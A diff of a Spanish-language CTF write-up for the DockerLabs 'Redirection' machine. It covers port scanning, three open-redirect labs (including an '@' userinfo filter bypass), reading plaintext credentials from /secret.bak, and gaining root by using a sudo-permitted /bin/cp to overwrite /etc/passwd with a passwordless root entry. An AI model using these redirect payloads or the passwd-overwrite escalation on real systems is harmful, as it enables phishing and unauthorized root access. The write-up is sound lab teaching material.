@@ -1,8 +1,8 @@
 # 🧠 Informe de Pentesting – Máquina: Redirection
 
-### 💡 Dificultad: Fácil
+## 💡 Dificultad: Fácil
 
-### 🧩 Plataforma: DockerLabs
+## 🧩 Plataforma: DockerLabs
 
 ![Despliegue](Imagenes/logo.png)
 
@@ -10,24 +10,22 @@
 
 # ⚙️ Despliegue de la máquina
 
-Antes de comenzar el proceso de reconocimiento y explotación, se procede al despliegue del laboratorio vulnerable proporcionado por DockerLabs.
+Antes de comenzar las fases de reconocimiento y explotación, se despliega el laboratorio vulnerable proporcionado por DockerLabs.
 
-La máquina se distribuye comprimida en formato `.zip`, incluyendo la imagen Docker necesaria para su ejecución y un script automatizado encargado de simplificar el proceso de despliegue.
-
-Para iniciar el entorno vulnerable se ejecutan los siguientes comandos:
+La máquina se distribuye en formato comprimido `.zip`, incluyendo la imagen Docker necesaria y un script automatizado para simplificar la creación del entorno.
 
 ```bash
 unzip redirection.zip
 sudo bash auto_deploy.sh redirection.tar
 ```
 
-## Explicación
+## Explicación de comandos
 
-* **unzip balulero.zip** → Extrae los archivos necesarios para el despliegue.
-* **auto_deploy.sh** → Automatiza la carga de la imagen Docker y la creación del contenedor.
-* **balulero.tar** → Imagen utilizada para desplegar la máquina vulnerable.
+* **unzip redirection.zip** → Extrae los archivos necesarios del laboratorio.
+* **auto_deploy.sh** → Script encargado de automatizar la importación y ejecución del contenedor.
+* **redirection.tar** → Imagen Docker utilizada para desplegar la máquina vulnerable.
 
-Una vez finalizado el proceso, el contenedor queda disponible dentro de la red interna de Docker.
+Tras finalizar el proceso, la máquina vulnerable queda disponible dentro de la red Docker local.
 
 ![Despliegue](Imagenes/despliegue.png)
 
@@ -35,63 +33,59 @@ Una vez finalizado el proceso, el contenedor queda disponible dentro de la red i
 
 # 📡 Verificación de conectividad
 
-Antes de iniciar las fases de reconocimiento, se valida la disponibilidad del objetivo dentro de la red.
+Antes de iniciar el reconocimiento se valida la disponibilidad del objetivo.
 
 ```bash
 ping -c 4 172.17.0.2
 ```
 
-## Explicación de parámetros
+## Explicación
 
-* **ping** → Herramienta utilizada para comprobar conectividad mediante paquetes ICMP.
-* **-c 4** → Envía únicamente cuatro solicitudes ICMP.
+* **ping** → Envía paquetes ICMP Echo Request.
+* **-c 4** → Limita el envío a cuatro paquetes.
 
-La recepción de respuestas confirma:
+La respuesta positiva confirma:
 
 * Disponibilidad del objetivo
-* Conectividad funcional entre atacante y víctima
-* Baja latencia esperada en entornos Docker
+* Conectividad entre atacante y víctima
+* Correcto funcionamiento de la red Docker
 
 ![Despliegue](Imagenes/ping.png)
 
 ---
 
-# 🔍 Fase de reconocimiento – Enumeración de puertos
+# 🔍 Reconocimiento – Enumeración de puertos
 
-La fase inicial de reconocimiento se centra en identificar la superficie de exposición del objetivo.
-
-Para ello se realiza un escaneo completo sobre todos los puertos TCP:
+Se realiza un escaneo completo de puertos TCP para identificar la superficie expuesta.
 
 ```bash
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
 ```
 
-## Explicación detallada
+## Explicación de parámetros
 
 * **-p-** → Escanea los 65535 puertos TCP.
 * **--open** → Muestra únicamente puertos abiertos.
-* **-sS** → Realiza un SYN Scan.
-* **--min-rate 5000** → Incrementa la velocidad de envío.
-* **-vvv** → Aumenta la verbosidad.
+* **-sS** → SYN Scan.
+* **--min-rate 5000** → Incrementa velocidad de envío.
+* **-vvv** → Verbosidad elevada.
 * **-n** → Evita resolución DNS.
-* **-Pn** → Omite el descubrimiento previo del host.
+* **-Pn** → Omite host discovery.
 
----
+## Resultados
 
-## Resultado del reconocimiento
-
-El análisis revela únicamente dos servicios expuestos:
+Se identifican únicamente dos servicios expuestos:
 
 * **22/tcp → SSH**
 * **80/tcp → HTTP**
 
-La reducida superficie de ataque sugiere que la explotación probablemente se centrará en el servicio web.
+La reducida superficie de ataque indica que el vector principal probablemente reside en la aplicación web.
 
 ---
 
 # 🔬 Enumeración de servicios
 
-Con los puertos identificados, se realiza una enumeración más profunda.
+Se profundiza sobre los servicios detectados:
 
 ```bash
 nmap -sCV -p22,80 172.17.0.2
@@ -103,64 +97,272 @@ nmap -sCV -p22,80 172.17.0.2
 * **-sV** → Identifica versiones.
 * **-p22,80** → Limita el análisis.
 
-Durante esta fase se confirma:
+La enumeración confirma:
 
 * Servicio SSH activo
-* Servidor web funcional
-* Posibles vectores relacionados con autenticación
+* Aplicación web funcional
+* Posibles mecanismos de autenticación
 
 ![Despliegue](Imagenes/nmap.png)
 
 ---
 
-# 🌐 Enumeración web
+# 🌐 Enumeración Web
 
-Se accede al servicio HTTP:
+Accedemos al servicio HTTP:
 
-```bash
+```text
 http://172.17.0.2
 ```
 
-La página presenta tres laboratorios a resolver
+La aplicación presenta tres laboratorios enfocados en vulnerabilidades de redirección.
 
 ---
 
-# Laboratorio 1
+# Laboratorio 1 – Open Redirect Básico
 
-Al analizar el codigo fuente se encuentra el fragmento de HTML/PHP:
+Durante el análisis del código fuente se identifica:
 
-<a href="redirect.php?url=http://google.com">Ir a otro sitio</a>
+```html
+<a href="redirect.php?url=http://google.com">
+```
 
-Esto significa que:
+Esto revela que:
 
-La página interactúa con un script del lado del servidor llamado redirect.php.
+* Existe un script llamado `redirect.php`
+* Recibe un parámetro GET llamado `url`
+* El parámetro probablemente es utilizado directamente para construir redirecciones
 
-Este script recibe un parámetro llamado url.
+Un código vulnerable podría verse así:
 
-El problema: Si el código interno de redirect.php simplemente toma el valor de url y hace un header("Location: " . $_GET['url']); sin filtrar nada, el sitio redirigirá a cualquier dirección que se le pase.
+```php
+header("Location: " . $_GET['url']);
+```
 
-Lo que hacemos en este primer laboratorios es:
+Esto provoca una vulnerabilidad **Open Redirect**, permitiendo enviar usuarios hacia cualquier dominio arbitrario.
 
-Se cambia el parámetro de la URL del laboratorios por:
+Se modifica la URL:
 
-```bash
+```text
 http://172.17.0.2/laboratorio1/redirect.php?url=https://github.com/Alejandro609x
 ```
 
-Aquí, en lugar de ir a un sitio neutro, se está forzando a la aplicación a apuntar hacia un perfil específico de GitHub
+La aplicación acepta el nuevo dominio y redirige correctamente.
 
+Esto demuestra falta de validación sobre dominios permitidos.
 
 ![Despliegue](Imagenes/laboratoriouno.png)
 
-
 ![Despliegue](Imagenes/laboratoriounourl.png)
-
 
 ![Despliegue](Imagenes/laboratoriounourlcambiada.png)
 
-
 ![Despliegue](Imagenes/laboratoriounocompleta.png)
 
+---
 
+# Laboratorio 2 – Bypass de validación usando @
 
+En este laboratorio existe un filtro adicional que intenta impedir redirecciones externas.
 
+La URL original:
+
+```text
+https://google.com
+```
+
+Es reemplazada por:
+
+```text
+http://172.17.0.2/laboratorio2/redirect.php?url=https://google.com@github.com/Alejandro609x
+```
+
+## ¿Por qué funciona?
+
+El símbolo `@` en URLs tiene significado especial:
+
+```text
+protocolo://usuario@host
+```
+
+Por ejemplo:
+
+```text
+https://google.com@github.com
+```
+
+Se interpreta como:
+
+* Usuario: `google.com`
+* Host real: `github.com`
+
+Muchos filtros vulnerables únicamente verifican si la cadena contiene `google.com`, pero el navegador realmente navega hacia el dominio ubicado **después del @**.
+
+Este bypass explota:
+
+* Validaciones basadas en cadenas
+* Filtros insuficientes
+* Falta de parsing seguro de URLs
+
+![Despliegue](Imagenes/laboratoriodoserror.png)
+
+![Despliegue](Imagenes/laboratoriosdosejemplovisual.png)
+
+---
+
+# Laboratorio 3 – Restricción por dominio permitido
+
+En este escenario existe una validación más restrictiva.
+
+La aplicación únicamente permite dominios específicos o relacionados.
+
+Aquí el bypass consiste en utilizar dominios permitidos o subdominios válidos para forzar redirecciones autorizadas.
+
+El objetivo ya no es redirigir a cualquier dominio, sino aprovechar la lógica permisiva implementada.
+
+![Despliegue](Imagenes/laboratoriosrtesejemplo.png)
+
+![Despliegue](Imagenes/laboratoriotres.png)
+
+![Despliegue](Imagenes/laboratoriostresresuelto.png)
+
+---
+
+# 🔑 Obtención de credenciales
+
+Tras completar los laboratorios se obtienen credenciales válidas para el sistema.
+
+Durante la exploración del sistema se encuentra:
+
+```bash
+cat /secret.bak
+```
+
+El archivo contiene:
+
+```text
+balulito:balulerochingon
+```
+
+Se utilizan las credenciales:
+
+```bash
+su balulito
+```
+
+Confirmando acceso como usuario limitado.
+
+---
+
+# 🚀 Escalada de Privilegios
+
+## Enumeración de privilegios sudo
+
+Se enumeran permisos disponibles:
+
+```bash
+sudo -l
+```
+
+La salida revela:
+
+```text
+(ALL) NOPASSWD: /bin/cp
+```
+
+Esto significa que el usuario puede ejecutar `/bin/cp` como root sin contraseña.
+
+Esta configuración representa una mala práctica crítica.
+
+---
+
+## Análisis del vector de ataque
+
+Se revisa la estructura de cuentas:
+
+```bash
+cat /etc/passwd
+```
+
+Entrada original:
+
+```text
+root:x:0:0:root:/root:/bin/bash
+```
+
+La `x` indica que la contraseña real se almacena en:
+
+```text
+/etc/shadow
+```
+
+La estrategia consiste en modificar la entrada root eliminando la referencia a la contraseña.
+
+---
+
+## Preparación del archivo manipulado
+
+Se crea una copia editable:
+
+```bash
+cp /etc/passwd /tmp/passwd
+nano /tmp/passwd
+```
+
+Se modifica:
+
+Antes:
+
+```text
+root:x:0:0:root:/root:/bin/bash
+```
+
+Después:
+
+```text
+root::0:0:root:/root:/bin/bash
+```
+
+Eliminar la `x` provoca que root quede configurado sin contraseña.
+
+---
+
+## Sobrescritura usando sudo mal configurado
+
+Aprovechando permisos sobre `/bin/cp`:
+
+```bash
+sudo -u root /bin/cp /tmp/passwd /etc/passwd
+```
+
+Esto reemplaza el archivo legítimo por la versión manipulada.
+
+---
+
+## Obtención de root
+
+Finalmente:
+
+```bash
+su root
+```
+
+Y verificamos:
+
+```bash
+whoami
+```
+
+Salida:
+
+```text
+root
+```
+
+La escalada de privilegios se completa exitosamente.
+
+![Despliegue](Imagenes/rootuno.png)
+
+![Despliegue](Imagenes/rootdos.png)
+
+---
